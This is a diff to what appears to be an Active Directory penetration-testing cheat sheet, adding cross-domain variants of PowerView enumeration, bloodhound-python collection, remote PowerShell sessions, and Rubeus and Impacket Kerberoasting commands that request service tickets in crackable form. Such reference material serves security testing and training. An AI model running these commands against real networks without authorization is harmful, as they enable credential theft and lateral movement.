@@ -164,7 +164,9 @@ PS C:\> Get-Domain
 PS C:\> Get-DomainController
 PS C:\> Get-DomainUser
 PS C:\> Get-DomainUser * -spn | select samaccountname
+PS C:\> Get-DomainUser -SPN -Domain <domain> | select SamAccountName
 PS C:\> Get-DomainUser -Identity <username> | select samaccountname,objectsid,memberof,useraccountcontrol |fl
+PS C:\> Get-DomainUser -Domain <domain> -Identity <username> | select samaccountname,memberof
 PS C:\> Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
 PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 PS C:\> Get-DomainUser <username> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
@@ -192,6 +194,7 @@ PS C:\> Get-DomainTrust
 PS C:\> Get-ForestTrust
 PS C:\> Get-DomainForeignUser
 PS C:\> Get-DomainForeignGroupMember
+PS C:\> Get-DomainForeignGroupMember -Domain <domain>
 PS C:\> Get-DomainTrustMapping
 PS C:\> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 PS C:\> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
@@ -235,6 +238,8 @@ PS C:\> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 
 ```
 $ sudo bloodhound-python -u '<username>' -p '<password>' -ns <name server> -d <domain> -c all
+$ bloodhound-python -d <domain> -dc <Domain Controller hostname> -c All -u <username> -p <password>
+$ zip -r mass_bh.zip *.json
 ```
 
 - LAPSToolkit
@@ -1103,6 +1108,7 @@ C:\> runas /savecred /user:<username> cmd
 ```
 PS C:\> Enter-PSSession -ComputerName <computer>
 PS C:\> Enter-PSSession -ComputerName <computer> -Credential $cred
+PS C:\> Enter-PSSession -ComputerName <computer> -Credential <domain>\<username>
 ```
 
 - Evil-WinRM
@@ -2084,6 +2090,7 @@ mimikatz # misc::cmd
 C:\> .\Rubeus.exe kerberoast /stats
 C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 C:\> .\Rubeus.exe kerberoast /user:<username> /nowrap
+C:\> .\Rubeus.exe kerberoast /domain:<domain> /user:<username> /nowrap
 C:\> .\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
 ```
 
@@ -2133,6 +2140,7 @@ $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username
 $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username> -request
 $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username> -request-user <username>
 $ python GetUserSPNs.py -dc-ip <Domain Controller IP address> <domain>/<username> -request-user <username> -outputfile <filename>
+$ python GetUserSPNs.py -request -target-domain <domain> <domain>/<username>
 ```
 
 - GPPDecrypt
